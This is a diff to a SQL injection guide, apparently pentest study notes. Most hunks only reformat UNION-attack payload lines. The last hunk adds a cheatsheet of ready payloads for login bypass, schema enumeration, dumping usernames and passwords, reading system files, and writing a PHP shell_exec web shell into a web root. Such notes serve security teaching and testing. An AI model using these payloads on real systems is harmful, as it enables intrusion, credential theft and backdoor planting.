@@ -127,9 +127,9 @@ When performing an SQL injection UNION attack, there are two effective methods t
 
 The first method involves injecting a series of `ORDER BY` clauses and incrementing the specified column index until an error occurs. For example, assuming the injection point is a quoted string within the `WHERE` clause of the original query, you would submit:
 
-`' ORDER BY 1--  `\
-`' ORDER BY 2--  `\
-`' ORDER BY 3--  `\
+`' ORDER BY 1--`  \
+`' ORDER BY 2--`  \
+`' ORDER BY 3--`  \
 `etc.`
 
 This series of payloads modifies the original query to order the results by different columns in the result set. The column in an `ORDER BY` clause can be specified by its index, so you don't need to know the names of any columns. When the specified column index exceeds the number of actual columns in the result set, the database returns an error, such as:
@@ -140,9 +140,9 @@ The application might actually return the database error in its HTTP response, o
 
 The second method involves submitting a series of `UNION SELECT` payloads specifying a different number of null values:
 
-`' UNION SELECT NULL--  `\
-`' UNION SELECT NULL,NULL--  `\
-`' UNION SELECT NULL,NULL,NULL--  `\
+`' UNION SELECT NULL--`  \
+`' UNION SELECT NULL,NULL--`  \
+`' UNION SELECT NULL,NULL,NULL--`  \
 `etc.`
 
 If the number of nulls does not match the number of columns, the database returns an error, such as:
@@ -187,9 +187,9 @@ The reason for performing an SQL injection UNION attack is to be able to retriev
 
 Having already determined the number of required columns, you can probe each column to test whether it can hold string data by submitting a series of `UNION SELECT` payloads that place a string value into each column in turn. For example, if the query returns four columns, you would submit:
 
-`' UNION SELECT 'a',NULL,NULL,NULL--  `\
-`' UNION SELECT NULL,'a',NULL,NULL--  `\
-`' UNION SELECT NULL,NULL,'a',NULL--  `\
+`' UNION SELECT 'a',NULL,NULL,NULL--`  \
+`' UNION SELECT NULL,'a',NULL,NULL--`  \
+`' UNION SELECT NULL,NULL,'a',NULL--`  \
 `' UNION SELECT NULL,NULL,NULL,'a'--`
 
 If the data type of a column is not compatible with string data, the injected query will cause a database error, such as:
@@ -281,9 +281,9 @@ For example, you could use a `UNION` attack with the following input:
 
 This might return output like the following, confirming that the database is Microsoft SQL Server, and the version that is being used:
 
-`Microsoft SQL Server 2016 (SP2) (KB4052908) - 13.0.5026.0 (X64)  `\
-`Mar 18 2018 09:11:49  `\
-`Copyright (c) Microsoft Corporation  `\
+`Microsoft SQL Server 2016 (SP2) (KB4052908) - 13.0.5026.0 (X64)`  \
+`Mar 18 2018 09:11:49`  \
+`Copyright (c) Microsoft Corporation`  \
 `Standard Edition (64-bit) on Windows Server 2016 Standard 10.0 <X64> (Build 14393: ) (Hypervisor)`
 
 **Example of an SQL injection attack, querying the database type and version on Oracle:**
@@ -509,6 +509,19 @@ UniOn selEct 1,load_file('ubicación del archivo') /*
 // Write files:
 UniOn selEct null,[contenido del archivo] inTo outfile '/ubicacion/donde/escribir/el/archivo' /*
 ```
+
+Another cheatsheet:
+
+* Authentication bypass ➡️ `' or 1=1 LIMIT 1;#`
+* Enumerate version ➡️ `?id=1 union all select 1, 2, @@version`
+* Enumerate database user ➡️ `?id=1 union all select 1, 2, user()`
+* Enumerate table names ➡️ `?id=1 union all select 1, 2, table_name from information_schema.tables`
+* Enumerate users table ➡️ `?id=1 union all select 1, 2, column_name from information_schema.columns where table_name='users'`
+* Get usernames and passwords from users table ➡️ `?id=1 union all select 1, username, password from users`
+* (Windows) Reading file attempt ➡️ `?id=1 union all select 1, 2, load_file('C:/Windows/System32/drivers/etc/hosts')`
+* (Windows) Writing file attempt ➡️ `?id=1 union all select 1, 2, "<?php echo shell_exec($_GET['cmd']);?>" into OUTFILE 'c:/xampp/htdocs/backdoor.php'`
+* (Linux) Reading file attempt ➡️ `?id=1 union all select 1, 2, load_file('/etc/passwd')`
+* (Windows) Writing file attempt ➡️ `?id=1 union all select 1, 2, "<?php echo shell_exec($_GET['cmd']);?>" into OUTFILE '/var/ww/html/backdoor.php'`
 
 Examples of TRUE statements to discover SQLi:
 
